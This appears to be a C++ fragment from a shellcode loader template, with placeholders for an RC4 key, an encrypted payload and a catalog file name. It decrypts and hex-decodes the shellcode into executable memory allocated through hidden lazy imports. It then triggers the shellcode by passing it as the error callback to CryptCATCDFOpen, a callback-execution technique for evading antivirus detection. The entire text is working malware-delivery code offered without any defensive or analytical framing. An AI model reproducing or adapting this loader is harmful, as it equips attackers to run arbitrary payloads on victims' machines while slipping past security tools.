	const char* key = "$$RC4_KEY$$";
	// encrypted shellcode
    unsigned char buf[] = { $$SHELLCODE$$ };
	//decrypt 

    decryptRC4Xor(key, buf, sizeof(buf)); 

    char* p = reinterpret_cast<char *>(buf);
    unsigned char* shellcode = (unsigned char*)calloc(strlen(reinterpret_cast<const char *>(buf)) / 2, sizeof(unsigned char));
    for (size_t i = 0; i < strlen(reinterpret_cast<const char *>(buf)) / 2; i++) {
        sscanf(p, "%2hhx", &shellcode[i]);
        p += 2;
    }

    SIZE_T bufSize = sizeof(buf) / 2;
    LoadLibraryA("wintrust.dll");
    LoadLibraryA("Kernel32.dll");
    void* execMem = LI_FN(VirtualAlloc)(reinterpret_cast<void*>(NULL), bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //void* execMem = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    my_memcpy(execMem, shellcode, bufSize);
    wchar_t cdfpath[50] = L"$$CDF_FILENAME$$";
    LI_FN(CryptCATCDFOpen)(cdfpath, (PFN_CDF_PARSE_ERROR_CALLBACK)execMem);
